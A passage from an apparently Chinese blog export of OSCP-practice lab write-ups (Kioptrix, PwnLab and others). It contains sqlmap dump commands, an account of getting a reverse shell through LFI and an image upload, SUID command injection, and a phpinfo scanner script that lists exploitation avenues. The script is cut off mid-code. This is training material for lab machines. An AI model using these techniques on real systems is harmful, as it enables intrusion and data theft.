<p><img src="https://i.loli.net/2020/07/15/eqYgh1H8sBkzCv9.png" alt="image.png"><br>字段：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -r 1 --batch --time-sec=2 -D Webapp -T Users --columns</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/07/15/Al7oHd9ygOz68VD.png" alt="image.png"><br>数据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -r 1 --batch --time-sec=2 -D Webapp -T Users -C username,password --dump</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/07/15/Mg38O9tSkp5yurw.png" alt="image.png"></p>
<table>
<thead>
<tr>
<th>username</th>
<th>password</th>
</tr>
</thead>
<tbody><tr>
<td>gimli</td>
<td>AndMyAxe</td>
</tr>
<tr>
<td>legolas</td>
<td>AndMyBow</td>
</tr>
<tr>
<td>aragorn</td>
<td>AndMySword</td>
</tr>
<tr>
<td>rodo</td>
<td>iwilltakethering</td>
</tr>
<tr>
<td>smeagol</td>
<td>MyPreciousR00t</td>
</tr>
</tbody></table>
<p>用上面的账号密码组合一下生成个字典跑一下ssh,结果如下：<br><img src="https://i.loli.net/2020/07/15/cdtUa8LuYyXRFV3.png" alt="image.png"><br>ssh进去瞧瞧<br><img src="https://i.loli.net/2020/07/15/Lme6YqscktrW1uB.png" alt="image.png"></p>
<h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><p>老规矩，传suggester，内核提权</p>
<p><img src="https://i.loli.net/2020/07/15/kvnigw148IYXoTb.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2020/07/15/ZDhGaMObsjUyVAo.png" alt="image.png"></p>
]]></content>
      <tags>
        <tag>OSCP</tag>
      </tags>
  </entry>
  <entry>
    <title>备战OSCP_Kioptrix_Level_1</title>
    <url>/2020/07/14/%E5%A4%87%E6%88%98OSCP_Kioptrix_Level_1/</url>
    <content><![CDATA[<h2 id="发现靶机"><a href="#发现靶机" class="headerlink" title="发现靶机"></a>发现靶机</h2><p><img src="https://i.loli.net/2020/07/14/NPu7BTE2lnKItUe.png" alt="clipboard.png"><br><img src="https://i.loli.net/2020/07/14/qrB7fSzINZbswnR.png" alt="clipboard.png"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><a id="more"></a>
<p>nmap：<br><img src="https://i.loli.net/2020/07/14/J4AVBQvl839uDWf.png" alt="clipboard.png"><br>目录扫描：<br><img src="https://i.loli.net/2020/07/14/w7JECUIy9LAsBxP.png" alt="clipboard.png"></p>
<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>在manual目录下发现目录遍历，apache版本1.3.20（从nmap信息也可看出）<br><img src="https://i.loli.net/2020/07/14/w4FJGv8VUNmIH6z.png" alt="clipboard.png"><br>包扩一些服务器状态和Webalizer Version 2.01，mod_ssl version 2.8 ，MRTG 2.9.6等等<br><img src="https://i.loli.net/2020/07/14/f9LnUsdgEqem5Z8.png" alt="clipboadddrd.png"><br><img src="https://i.loli.net/2020/07/14/P6Mc1VF3EsB4SaA.png" alt="clipbosard.png"><br><img src="https://i.loli.net/2020/07/14/t7zUIhJVmq1y2jg.png" alt="clipboard.png"><br>根据mod_ssl version 2.8这个信息找到个缓冲区溢出<br><img src="https://i.loli.net/2020/07/14/CJPAjSr1MHapxRT.png" alt="clipboard.png"><br>编译时如果出错了可以参考这个<br>https://github.com/heltonWernik/OpenLuck，我这里就是直接用他的文件<br>根据发行版本和apache版本，试了好几次，终于成功了<br><img src="https://i.loli.net/2020/07/14/NwdubTVWi487sx2.png" alt="clipboard.png"></p>
<h2 id="权限提升1"><a href="#权限提升1" class="headerlink" title="权限提升1"></a>权限提升1</h2><p>我吐了。试了一下suid提权，结果中间断开了，重连一次就变成root了<br><img src="https://i.loli.net/2020/07/14/vPy2b9ZXl6GCqfz.png" alt="clipboard.png"></p>
<h2 id="权限提升2"><a href="#权限提升2" class="headerlink" title="权限提升2"></a>权限提升2</h2><p>听别人说还有samba方式<br><img src="https://i.loli.net/2020/07/14/s1umoBNFDpWdfla.png" alt="clipboard.png"><br><img src="https://i.loli.net/2020/07/14/Da5wNBQbo6Ecg7j.png" alt="clipboarsd.png"></p>
<p><img src="https://i.loli.net/2020/07/14/lhOzxQe1MFn5Ly4.png" alt="Image 19.png"></p>
]]></content>
      <tags>
        <tag>OSCP</tag>
      </tags>
  </entry>
  <entry>
    <title>备战 OSCP_PwnLab_init</title>
    <url>/2020/07/14/%E5%A4%87%E6%88%98OSCP_PwnLab_init/</url>
    <content><![CDATA[<h2 id="发现靶机"><a href="#发现靶机" class="headerlink" title="发现靶机"></a>发现靶机</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure><a id="more"></a>
<p><img src="https://i.loli.net/2020/07/14/MqOwykHCvKTGNVs.png" alt="clipboard.png"><br><img src="https://i.loli.net/2020/07/14/t8Gq4zKSexmFM9R.png" alt="clipbsssoard.png"></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>端口信息<br><img src="https://i.loli.net/2020/07/14/BI6TSfUXrDAV1P7.png" alt="clipboadddrd.png"></p>
<p>3306没爆破出来，39968不知道是什么鬼<br>只能搞80了<br><img src="https://i.loli.net/2020/07/14/VUkMWR43qEgxNfj.png" alt="dddd.png"><br>爆破一下登录<br><img src="https://i.loli.net/2020/07/14/Jq6zkAgsHOD8rCe.png" alt="clipbsddasoard.png"><br>扫了一下目录，有config.php,index.php,login.php,upload.php和一些目录<br><img src="https://i.loli.net/2020/07/14/MCW3x9mzhrUo6Bi.png" alt="clisdaasdasboard.png"><br>除了images里面有张图片，其他都要登录才行<br><img src="https://i.loli.net/2020/07/14/dq4Eu8ZXB63FIGa.png" alt="clipbsssard.png"><br>看了下这张图片，没有发现任何线索<br><img src="https://i.loli.net/2020/07/14/3hu5NaSl6FfriZE.png" alt="clipboard.png"><br>burp爆破登录也没结果<br><img src="https://i.loli.net/2020/07/14/ZUkFdJxTAXm2VsC.png" alt="clipbsssoard.png"><br>http://172.21.137.244/config.php 应该是有内容，但是不显示出来<br><img src="https://i.loli.net/2020/07/14/S5WdNoJIMr87Gsw.png" alt="image.png"><br>都看了一圈，好像实在没地方下手了<br>又看回了这个页面，发现url里好像可以搞搞<br><img src="https://i.loli.net/2020/07/14/482JrPWjmLi6qsX.png" alt="imassssssge.png"></p>
<p>存在LFI漏洞<br><img src="https://i.loli.net/2020/07/14/P1pDfTaNEBo8Sxb.png" alt="imaddddge.png"><br>看到是连接mysql<br>尝试读一下之前的config.php，wdnmd，难怪爆不出来<br><img src="https://i.loli.net/2020/07/14/XGhrDs5qcEZYICS.png" alt="imadddge.png"><br>upload.php文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&apos;user&apos;])) &#123; die(&apos;You must be log in.&apos;); &#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;form action=&apos;&apos; method=&apos;post&apos; enctype=&apos;multipart/form-data&apos;&gt;</span><br><span class="line">			&lt;input type=&apos;file&apos; name=&apos;file&apos; id=&apos;file&apos; /&gt;</span><br><span class="line">			&lt;input type=&apos;submit&apos; name=&apos;submit&apos; value=&apos;Upload&apos;/&gt;</span><br><span class="line">		&lt;/form&gt;</span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">if(isset($_POST[&apos;submit&apos;])) &#123;</span><br><span class="line">	if ($_FILES[&apos;file&apos;][&apos;error&apos;] &lt;= 0) &#123;</span><br><span class="line">		$filename  = $_FILES[&apos;file&apos;][&apos;name&apos;];</span><br><span class="line">		$filetype  = $_FILES[&apos;file&apos;][&apos;type&apos;];</span><br><span class="line">		$uploaddir = &apos;upload/&apos;;</span><br><span class="line">		$file_ext  = strrchr($filename, &apos;.&apos;);</span><br><span class="line">		$imageinfo = getimagesize($_FILES[&apos;file&apos;][&apos;tmp_name&apos;]);</span><br><span class="line">		$whitelist = array(&quot;.jpg&quot;,&quot;.jpeg&quot;,&quot;.gif&quot;,&quot;.png&quot;); </span><br><span class="line"></span><br><span class="line">		if (!(in_array($file_ext, $whitelist))) &#123;</span><br><span class="line">			die(&apos;Not allowed extension, please upload images only.&apos;);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		if(strpos($filetype,&apos;image&apos;) === false) &#123;</span><br><span class="line">			die(&apos;Error 001&apos;);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		if($imageinfo[&apos;mime&apos;] != &apos;image/gif&apos; &amp;&amp; $imageinfo[&apos;mime&apos;] != &apos;image/jpeg&apos; &amp;&amp; $imageinfo[&apos;mime&apos;] != &apos;image/jpg&apos;&amp;&amp; $imageinfo[&apos;mime&apos;] != &apos;image/png&apos;) &#123;</span><br><span class="line">			die(&apos;Error 002&apos;);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		if(substr_count($filetype, &apos;/&apos;)&gt;1)&#123;</span><br><span class="line">			die(&apos;Error 003&apos;);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		$uploadfile = $uploaddir . md5(basename($_FILES[&apos;file&apos;][&apos;name&apos;])).$file_ext;</span><br><span class="line"></span><br><span class="line">		if (move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;], $uploadfile)) &#123;</span><br><span class="line">			echo &quot;&lt;img src=\&quot;&quot;.$uploadfile.&quot;\&quot;&gt;&lt;br /&gt;&quot;;</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			die(&apos;Error 4&apos;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>index.php文件，有意思的是该文件写了个包含</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//Multilingual. Not implemented yet.</span><br><span class="line">//setcookie(&quot;lang&quot;,&quot;en.lang.php&quot;);</span><br><span class="line">if (isset($_COOKIE[&apos;lang&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">	include(&quot;lang/&quot;.$_COOKIE[&apos;lang&apos;]);</span><br><span class="line">&#125;</span><br><span class="line">// Not implemented yet.</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;PwnLab Intranet Image Hosting&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;img src=&quot;images/pwnlab.png&quot;&gt;&lt;br /&gt;</span><br><span class="line">[ &lt;a href=&quot;/&quot;&gt;Home&lt;/a&gt; ] [ &lt;a href=&quot;?page=login&quot;&gt;Login&lt;/a&gt; ] [ &lt;a href=&quot;?page=upload&quot;&gt;Upload&lt;/a&gt; ]</span><br><span class="line">&lt;hr/&gt;&lt;br/&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	if (isset($_GET[&apos;page&apos;]))</span><br><span class="line">	&#123;</span><br><span class="line">		include($_GET[&apos;page&apos;].&quot;.php&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		echo &quot;Use this server to upload and share image files inside the intranet&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>靶机开放了3306，连数据库看看<br><img src="https://i.loli.net/2020/07/14/1AzJ9eOn4v6wWfR.png" alt="image.png"><br>就这一个表,这密码也是挺难爆破的</p>
<table>
<thead>
<tr>
<th>账号</th>
<th>密码</th>
</tr>
</thead>
<tbody><tr>
<td>kent</td>
<td>JWzXuBJJNy</td>
</tr>
<tr>
<td>mike</td>
<td>SIfdsTEn6I</td>
</tr>
<tr>
<td>kane</td>
<td>iSv5Ym2GRo</td>
</tr>
</tbody></table>
<p>使用上面的面登录进去，发现还是要靠上传和index.php文件包含来getshell<br><img src="https://i.loli.net/2020/07/14/LmbAkVuFHNl4Xyj.png" alt="imaddge.png"><br>让我想起了以前碰到过的一种情况<br><img src="https://i.loli.net/2020/07/14/k2DO8CFVdhSQBbM.png" alt="image.png"><br>改好文件之后上传<br><img src="https://i.loli.net/2020/07/14/5zNvMVQTYWRE396.png" alt="imsssage.png"><br>开启监听并且尝试在index.php中包含<br><img src="https://i.loli.net/2020/07/14/tLwmQI2JyvUS9ha.png" alt="s.png"><br>成功反弹到了shell，但是权限太低了<br><img src="https://i.loli.net/2020/07/14/kAltYgqdyuIeECS.png" alt="iaaamage.png"><br><img src="https://i.loli.net/2020/07/14/eRlbsKoqaZ5pwj9.png" alt="imasge.png"><br>/etc/passwd和home目录信息，看到存在跟上面一样的3个用户，应该密码也是一样的<br><img src="https://i.loli.net/2020/07/14/grhmZ9VkBQioj5F.png" alt="imdddage.png"><br>这两用户没啥东西<br><img src="https://i.loli.net/2020/07/14/EWZgVSwHm6s4qQT.png" alt="imdage.png"><br>kane用户下还有个msgmike，是个elf文件</p>
<p><img src="https://i.loli.net/2020/07/14/NYJpjw1ylsk7ShO.png" alt="imadddge.png"><br>mike权限的msgmike？</p>
<p><img src="https://i.loli.net/2020/07/14/68RK2YTG3wSomrZ.png" alt="imdddddaage.png"><br>显示没有cat<br><img src="https://i.loli.net/2020/07/14/m1YbXslFWL3kAoV.png" alt="imaddage.png"></p>
<p>搞了好久，终于进到mike了（）</p>
<p><img src="https://i.loli.net/2020/07/14/bTKuEGQ8olezSmd.png" alt="imadage.png"><br>进到mike目录发现msg2root，又来?<br><img src="https://i.loli.net/2020/07/14/KJ7LChVTgw6lOzG.png" alt="imaaaasage.png"><br>试了半天，发现文件里写了个好东西，直接将输入写到/root/messages.txt里<br><img src="https://i.loli.net/2020/07/14/EkY37fyh4DmAd6j.png" alt="imasadasasge.png"><br>这里就直接命令注入了<br><img src="https://i.loli.net/2020/07/14/hoyGmWES1HM8wdZ.png" alt="image.png"></p>
<p>flag<br><img src="https://i.loli.net/2020/07/14/zuAcoXgS5wGIRm7.png" alt="imassge.png"></p>
]]></content>
      <tags>
        <tag>OSCP</tag>
      </tags>
  </entry>
  <entry>
    <title>备战OSCP_靶场list</title>
    <url>/2020/07/13/%E5%A4%87%E6%88%98OSCP_%E9%9D%B6%E5%9C%BAlist/</url>
    <content><![CDATA[<h3 id="VulnHub"><a href="#VulnHub" class="headerlink" title="VulnHub:"></a>VulnHub:</h3><a id="more"></a><ul>
<li><input checked disabled type="checkbox"> GoldenEye</li>
<li><input checked disabled type="checkbox"> PwnLab: init</li>
<li><input checked disabled type="checkbox"> Lord of the Root </li>
<li><input checked disabled type="checkbox"> DerpnStink</li>
<li><input checked disabled type="checkbox"> FristiLeaks  </li>
<li><input checked disabled type="checkbox"> Stapler </li>
<li><input checked disabled type="checkbox"> SickOS 1</li>
<li><input checked disabled type="checkbox"> SickOS 2</li>
<li><input checked disabled type="checkbox"> Tr0ll 1</li>
<li><input disabled type="checkbox"> Tr0ll 2</li>
<li><input checked disabled type="checkbox"> Kioptrix 1</li>
<li><input disabled type="checkbox"> Kioptrix (2-5)</li>
<li><input disabled type="checkbox"> BrainPan (BoF!)</li>
</ul>
<h3 id="HackTheBox"><a href="#HackTheBox" class="headerlink" title="HackTheBox:"></a>HackTheBox:</h3><ul>
<li><input disabled type="checkbox"> Bashed</li>
<li><input disabled type="checkbox"> Popcorn</li>
<li><input disabled type="checkbox"> Shocker</li>
<li><input disabled type="checkbox"> Blue</li>
<li><input disabled type="checkbox"> BankRobber</li>
<li><input disabled type="checkbox"> legacy</li>
<li><input disabled type="checkbox"> Tartarsauce</li>
<li><input disabled type="checkbox"> Grandpa</li>
<li><input disabled type="checkbox"> Granny</li>
<li><input disabled type="checkbox"> CronOS</li>
</ul>
]]></content>
      <tags>
        <tag>OSCP</tag>
      </tags>
  </entry>
  <entry>
    <title>phpinfo_scanner忽略证书错误修改</title>
    <url>/2020/06/23/phpinfo_scanner%E5%BF%BD%E7%95%A5%E8%AF%81%E4%B9%A6%E9%94%99%E8%AF%AF%E4%BF%AE%E6%94%B9/</url>
    <content><![CDATA[<p>今天发现phpinfo_scanner的一个问题，当遇到证书不匹配等问题就爬不出来，然后我就加了个忽略证书错误。没啥大变动，只是备份一下</p><a id="more"></a>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#-*- coding:utf-8 -*-</span><br><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">from bs4 import BeautifulSoup, element</span><br><span class="line">from tabulate import tabulate</span><br><span class="line">import wcwidth</span><br><span class="line">import pprint</span><br><span class="line"></span><br><span class="line">#将重要信息取出，转化为dict</span><br><span class="line">def info_to_dict(html):</span><br><span class="line">    phpinfo_dict = &#123;&#125;</span><br><span class="line">    #基本信息</span><br><span class="line">    phpinfo_dict[&quot;Baseinfo&quot;] = &#123;&#125;</span><br><span class="line">    base_info_table = html.select(&quot;body &gt; div &gt; table:nth-child(2)&quot;)[0] if len(html.select(&quot;body &gt; div &gt; table:nth-child(2)&quot;)) != 0 else html.select(&quot;body &gt; div &gt; table:nth-child(3)&quot;)[0]</span><br><span class="line">    for tr in base_info_table.find_all(&quot;tr&quot;):</span><br><span class="line">        key   = tr.select(&quot;td.e&quot;)[0].string.strip()</span><br><span class="line">        value = tr.select(&quot;td.v&quot;)[0].string.strip()</span><br><span class="line">        phpinfo_dict[&quot;Baseinfo&quot;][key] = value</span><br><span class="line"></span><br><span class="line">    for h2 in html.find_all(&quot;h2&quot;):</span><br><span class="line">        module_name = h2.string.strip()</span><br><span class="line">        phpinfo_dict[module_name] = &#123;&#125;</span><br><span class="line">        #每一个配置模块是从h2标题开始的，向下寻找所有的table标签</span><br><span class="line">        #有一个特殊情况PHP Credits，它在h1标签中，其内容是php及其sapi、module等的作者，对脚本功能没有意义，所以不解析</span><br><span class="line">        for sibling in h2.next_siblings:</span><br><span class="line">            #使用next_siblings会匹配到许多\n \t等，需特殊处理，官方文档明确提到</span><br><span class="line">            if sibling.name != &quot;table&quot; and type(sibling) != element.NavigableString and sibling.name != &quot;br&quot;:</span><br><span class="line">                break</span><br><span class="line">            if sibling.name == &quot;table&quot;:</span><br><span class="line">                for tr in sibling.find_all(&quot;tr&quot;):</span><br><span class="line">                    key_elements = tr.select(&quot;td.e&quot;)</span><br><span class="line">                    if len(key_elements) == 0:</span><br><span class="line">                        continue</span><br><span class="line">                    key = key_elements[0].string.strip()</span><br><span class="line"></span><br><span class="line">                    value_elements = tr.select(&quot;td.v&quot;)</span><br><span class="line">                    if len(value_elements) == 0:</span><br><span class="line">                        value = &apos;&apos;</span><br><span class="line">                    elif len(value_elements) == 2:</span><br><span class="line">                        # 有些配置的value分为Local Value和Master Value</span><br><span class="line">                        # local value是当前目录的设置，会受.htaccess、.user.ini、代码中ini_set()等的影响</span><br><span class="line">                        # master value是php.ini中的值</span><br><span class="line">                        value = [value_elements[0].string.strip(), value_elements[1].string.strip()]</span><br><span class="line">                    else:</span><br><span class="line">                        value = &quot;no value&quot; if value_elements[0].string == None else value_elements[0].string.strip()</span><br><span class="line">                    phpinfo_dict[module_name][key] = value</span><br><span class="line">    </span><br><span class="line">    #windos _SERVER[&quot;xx&quot;]</span><br><span class="line">    #linux $_SERVER[&apos;xx&apos;]</span><br><span class="line">    #消除这种差异</span><br><span class="line">    php_var_dict = &#123;&#125;</span><br><span class="line">    if list(phpinfo_dict[&quot;PHP Variables&quot;].keys())[0][0] == &quot;_&quot;:</span><br><span class="line">        for key in phpinfo_dict[&quot;PHP Variables&quot;].keys():</span><br><span class="line">            new_key = &quot;$&quot; + key.replace(&apos;&quot;&apos;, &quot;&apos;&quot;)</span><br><span class="line">            php_var_dict[new_key] = phpinfo_dict[&quot;PHP Variables&quot;][key]</span><br><span class="line">        phpinfo_dict[&quot;PHP Variables&quot;] = php_var_dict</span><br><span class="line">    return phpinfo_dict</span><br><span class="line"></span><br><span class="line">#获取关键信息</span><br><span class="line">def get_important_info(phpinfo_dict):</span><br><span class="line">    result = []</span><br><span class="line">    #web目录</span><br><span class="line">    result.append([&quot;Web Path&quot;, phpinfo_dict[&quot;PHP Variables&quot;][&quot;$_SERVER[&apos;SCRIPT_FILENAME&apos;]&quot;]])</span><br><span class="line">    #真实ip</span><br><span class="line">    server_ip = phpinfo_dict[&quot;PHP Variables&quot;][&quot;$_SERVER[&apos;LOCAL_ADDR&apos;]&quot;] if &quot;$_SERVER[&apos;LOCAL_ADDR&apos;]&quot; in phpinfo_dict[&quot;PHP Variables&quot;] else phpinfo_dict[&quot;PHP Variables&quot;][&quot;$_SERVER[&apos;SERVER_ADDR&apos;]&quot;]</span><br><span class="line">    result.append([&quot;Server IP&quot;, server_ip])</span><br><span class="line">    #中间件</span><br><span class="line">    result.append([&quot;Software&quot;, phpinfo_dict[&quot;PHP Variables&quot;][&quot;$_SERVER[&apos;SERVER_SOFTWARE&apos;]&quot;]])</span><br><span class="line">    #php版本</span><br><span class="line">    phpversion = phpinfo_dict[&quot;Core&quot;][&quot;PHP Version&quot;]</span><br><span class="line">    result.append([&quot;PHP Version&quot;, phpversion])</span><br><span class="line">    #系统信息</span><br><span class="line">    result.append([&quot;System&quot;, phpinfo_dict[&quot;Baseinfo&quot;][&quot;System&quot;]])</span><br><span class="line">    #SAPI</span><br><span class="line">    result.append([&quot;Server API&quot;, phpinfo_dict[&quot;Baseinfo&quot;][&quot;Server API&quot;]])</span><br><span class="line">    #Registered PHP Streams</span><br><span class="line">    result.append([&quot;Registered PHP Streams&quot;, phpinfo_dict[&quot;Baseinfo&quot;][&quot;Registered PHP Streams&quot;]])</span><br><span class="line">    #allow_url_include</span><br><span class="line">    result.append([&quot;Allow Url Include&quot;, &quot;, &quot;.join(phpinfo_dict[&quot;Core&quot;][&quot;allow_url_include&quot;])])</span><br><span class="line">    #asp_tags</span><br><span class="line">    #php7之后已移除</span><br><span class="line">    if &quot;asp_tags&quot; in phpinfo_dict[&quot;Core&quot;]:</span><br><span class="line">        result.append([&quot;Asp Tags&quot;, &quot;, &quot;.join(phpinfo_dict[&quot;Core&quot;][&quot;asp_tags&quot;])])</span><br><span class="line">    #short_open_tag</span><br><span class="line">    result.append([&quot;Short Open Tag&quot;, &quot;, &quot;.join(phpinfo_dict[&quot;Core&quot;][&quot;short_open_tag&quot;])])</span><br><span class="line">    #enable_dl</span><br><span class="line">    result.append([&quot;Enable Dl&quot;, &quot;, &quot;.join(phpinfo_dict[&quot;Core&quot;][&quot;enable_dl&quot;])])</span><br><span class="line">    #open_basedir</span><br><span class="line">    result.append([&quot;Open Basedir&quot;, &quot;, &quot;.join(phpinfo_dict[&quot;Core&quot;][&quot;open_basedir&quot;])])</span><br><span class="line">    #session</span><br><span class="line">    ser_handler = &quot;,&quot;.join(phpinfo_dict[&quot;session&quot;][&quot;session.serialize_handler&quot;])</span><br><span class="line">    upload_progress_enabled = &quot;,&quot;.join(phpinfo_dict[&quot;session&quot;][&quot;session.upload_progress.enabled&quot;])</span><br><span class="line">    upload_progress_cleanup = &quot;,&quot;.join(phpinfo_dict[&quot;session&quot;][&quot;session.upload_progress.cleanup&quot;])</span><br><span class="line">    upload_progress_name = &quot;,&quot;.join(phpinfo_dict[&quot;session&quot;][&quot;session.upload_progress.name&quot;])</span><br><span class="line">    session_info = &quot;session.serialize_handler:       %s\nsession.upload_progress.enabled: %s\nsession.upload_progress.cleanup: %s\nsession.upload_progress.name:    %s&quot; % (ser_handler, upload_progress_enabled, upload_progress_cleanup, upload_progress_name)</span><br><span class="line">    result.append([&quot;Session&quot;, session_info])</span><br><span class="line">    #curl</span><br><span class="line">    #if  &quot;curl&quot; in phpinfo_dict:</span><br><span class="line">        #result.append([&quot;Curl Protocols&quot;, phpinfo_dict[&quot;curl&quot;][&quot;Protocols&quot;].replace(&quot; &quot;, &quot;&quot;)])</span><br><span class="line">    #libxml</span><br><span class="line">    if &quot;libxml&quot; in phpinfo_dict:</span><br><span class="line">        result.append([&quot;Libxml Version&quot;, phpinfo_dict[&quot;libxml&quot;][&quot;libXML Compiled Version&quot;]])</span><br><span class="line">    #disable function</span><br><span class="line">    disable_func = phpinfo_dict[&quot;Core&quot;][&quot;disable_functions&quot;][0]</span><br><span class="line">    result.append([&quot;Disable Function&quot;, disable_func.replace(&quot;,&quot;, &quot;\n&quot;)])</span><br><span class="line">    #extentions</span><br><span class="line">    extentions = [&quot;imagick&quot;, &quot;memcache&quot;, &quot;redis&quot;, &quot;xdebug&quot;, &quot;opcache&quot;, &quot;imap&quot;]</span><br><span class="line">    exist_ext = []</span><br><span class="line">    for ext in extentions:</span><br><span class="line">        if ext in phpinfo_dict:</span><br><span class="line">            exist_ext.append(ext)</span><br><span class="line">    intresting_exts = &quot;No Intrestring Ext&quot; if len(exist_ext) == 0 else &quot;, &quot;.join(exist_ext)</span><br><span class="line">    result.append([&quot;Extentions&quot;, intresting_exts])</span><br><span class="line"></span><br><span class="line">    return tabulate(result, tablefmt=&quot;psql&quot;)</span><br><span class="line"></span><br><span class="line">#解析获取到的信息，如bypass_disable_function、php版本特性等</span><br><span class="line">def get_parsed_info(phpinfo_dict):</span><br><span class="line">    result = []</span><br><span class="line">    #php version</span><br><span class="line">    suggestion = get_version_feature(phpinfo_dict[&quot;Core&quot;][&quot;PHP Version&quot;])</span><br><span class="line">    if suggestion:</span><br><span class="line">        result.append([suggestion])</span><br><span class="line">    #sapi</span><br><span class="line">    sapi = phpinfo_dict[&quot;Baseinfo&quot;][&quot;Server API&quot;]</span><br><span class="line">    if &quot;FPM&quot; in sapi:</span><br><span class="line">        result.append([&quot;SAPI为fpm，可能存在未授权访问漏洞&quot;])</span><br><span class="line">    #phar</span><br><span class="line">    if &quot;phar&quot; in phpinfo_dict[&quot;Baseinfo&quot;][&quot;Registered PHP Streams&quot;]:</span><br><span class="line">        result.append([&quot;支持phar协议，可扩展反序列化攻击面&quot;])</span><br><span class="line">    #ssrf curl php_wrapper</span><br><span class="line">    protocols = [&quot;gopher&quot;, &quot;dict&quot;]</span><br><span class="line">    available_protocols = []</span><br><span class="line">    if &quot;curl&quot; in phpinfo_dict:</span><br><span class="line">        for protocol in protocols:</span><br><span class="line">            if protocol in phpinfo_dict[&quot;curl&quot;][&quot;Protocols&quot;]:</span><br><span class="line">                available_protocols.append(protocol)</span><br><span class="line">        result.append([&quot;libcurl支持%s协议&quot; % (&quot;, &quot;.join(available_protocols))])</span><br><span class="line">    #libxml版本</span><br><span class="line">    if &quot;libxml&quot; in phpinfo_dict and phpinfo_dict[&quot;libxml&quot;][&quot;libXML Compiled Version&quot;] &lt; &quot;2.9&quot;:</span><br><span class="line">        result.append([&quot;libxml版本 &lt; 2.9 xxe可利用&quot;])</span><br><span class="line">    #session upload progress</span><br><span class="line">    if phpinfo_dict[&quot;session&quot;][&quot;session.upload_progress.enabled&quot;][0] == &quot;On&quot;:</span><br><span class="line">        suggestion = &quot;可利用session.upload_progress上传临时文件然后包含&quot;</span><br><span class="line">        if phpinfo_dict[&quot;session&quot;][&quot;session.upload_progress.cleanup&quot;][0] == &quot;On&quot;:</span><br><span class="line">            suggestion += &quot;\n临时文件会立刻删除，需用条件竞争getshell&quot;</span><br><span class="line">        result.append([suggestion])</span><br><span class="line">    #session ser handler</span><br><span class="line">    if phpinfo_dict[&quot;session&quot;][&quot;session.serialize_handler&quot;][0] != phpinfo_dict[&quot;session&quot;][&quot;session.serialize_handler&quot;][1]:</span><br><span class="line">        result.append([&quot;ser handler不一致，存在反序列化风险&quot;])</span><br><span class="line">    #imagick</span><br><span class="line">    if &quot;imagick&quot; in phpinfo_dict:</span><br><span class="line">        result.append([&quot;可利用imagick相关漏洞&quot;])</span><br><span class="line">    #xdebug</span><br><span class="line">    if &quot;xdebug&quot; in phpinfo_dict and phpinfo_dict[&quot;xdebug&quot;][&quot;xdebug.remote_connect_back&quot;][0] == &quot;On&quot; and phpinfo_dict[&quot;xdebug&quot;][&quot;xdebug.remote_enable&quot;][0] == &quot;On&quot;:</span><br><span class="line">        result.append([&quot;存在xdebug rce https://github.com/vulhub/vulhub/tree/master/php/xdebug-rce\nxdebug idekey: &quot; + phpinfo_dict[&quot;xdebug&quot;][&quot;xdebug.idekey&quot;][0]])</span><br><span class="line">    #opcache</span><br><span class="line">    if &quot;opcache&quot; in phpinfo_dict:</span><br><span class="line">        result.append([&quot;可上传opcache覆盖源文件&quot;])</span><br><span class="line">    #imap</span><br><span class="line">    if &quot;imap&quot; in phpinfo_dict:</span><br><span class="line">        result.append([&quot;可能存在imap rce https://github.com/vulhub/vulhub/blob/master/php/CVE-2018-19518/README.md&quot;])</span><br><span class="line">    #disable function</span><br><span class="line">    if phpinfo_dict[&quot;Core&quot;][&quot;disable_functions&quot;][0] != &quot;no value&quot;:</span><br><span class="line">        result.append([bypass_disable_function(phpinfo_dict[&quot;Core&quot;][&quot;disable_functions&quot;][0], phpinfo_dict)])</span><br><span class="line">    return tabulate(result, tablefmt=&quot;grid&quot;)</span><br><span class="line"></span><br><span class="line">#根据版本获取版本特性</span><br><span class="line">def get_version_feature(version):</span><br><span class="line">    suggestion = &quot;&quot;</span><br><span class="line">    if &quot;7.2&quot; in version:</span><br><span class="line">        suggestion = 